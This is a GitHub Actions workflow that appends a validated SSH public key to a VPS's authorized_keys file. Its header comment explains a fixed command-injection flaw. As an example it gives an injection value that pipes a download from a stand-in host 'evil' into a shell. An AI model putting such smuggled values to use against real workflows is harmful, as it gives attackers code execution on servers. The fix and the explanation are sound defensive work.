name: Add SSH key to VPS

# TEMPORARY workflow — delete this file once the new key is confirmed working.
# Uses the existing VPS_SSH_KEY secret (already authorized on the VPS) to add
# a second public key, so a machine without VPS_SSH_KEY (e.g. home laptop)
# can SSH in directly afterwards.
#
# ⚠️ The input never appears inside a script as ${{ … }}: GitHub expands that
# into the script text before the shell runs, so a "key" like
# `x"; curl evil | sh; "` used to run on the VPS with the deploy user's
# rights. It travels as an environment variable instead, and is checked to be
# one OpenSSH public-key line (a character set with no shell metacharacters)
# before it is sent anywhere.
on:
  workflow_dispatch:
    inputs:
      public_key:
        description: "Public key to authorize (paste full line, e.g. 'ssh-ed25519 AAAA... comment')"
        required: true

permissions:
  contents: read

jobs:
  add-key:
    runs-on: ubuntu-latest
    env:
      PUBLIC_KEY: ${{ github.event.inputs.public_key }}
    steps:
      - name: Check the input is one OpenSSH public key
        shell: bash
        run: |
          set -euo pipefail
          key_pattern='^(ssh-ed25519|ssh-rsa|ecdsa-sha2-nistp(256|384|521)|sk-ssh-ed25519@openssh\.com|sk-ecdsa-sha2-nistp256@openssh\.com) [A-Za-z0-9+/]+={0,3}( [A-Za-z0-9@._-]{1,100})?$'
          if [[ ! "$PUBLIC_KEY" =~ $key_pattern ]]; then
            echo "::error::public_key must be a single OpenSSH public key line: <type> <base64> [comment]"
            exit 1
          fi

      - name: Append public key to VPS authorized_keys
        uses: appleboy/ssh-action@7eaf76671a0d7eec5d98ee897acda4f968735a17 # v1.2.0
        with:
          host: ${{ secrets.VPS_HOST }}
          username: ${{ secrets.VPS_USER }}
          key: ${{ secrets.VPS_SSH_KEY }}
          port: ${{ secrets.VPS_PORT }}
          envs: PUBLIC_KEY
          script_stop: true
          script: |
            set -euo pipefail
            mkdir -p ~/.ssh
            chmod 700 ~/.ssh
            touch ~/.ssh/authorized_keys
            grep -qxF -- "$PUBLIC_KEY" ~/.ssh/authorized_keys || \
              printf '%s\n' "$PUBLIC_KEY" >> ~/.ssh/authorized_keys
            chmod 600 ~/.ssh/authorized_keys
            echo "Key added (or already present)."
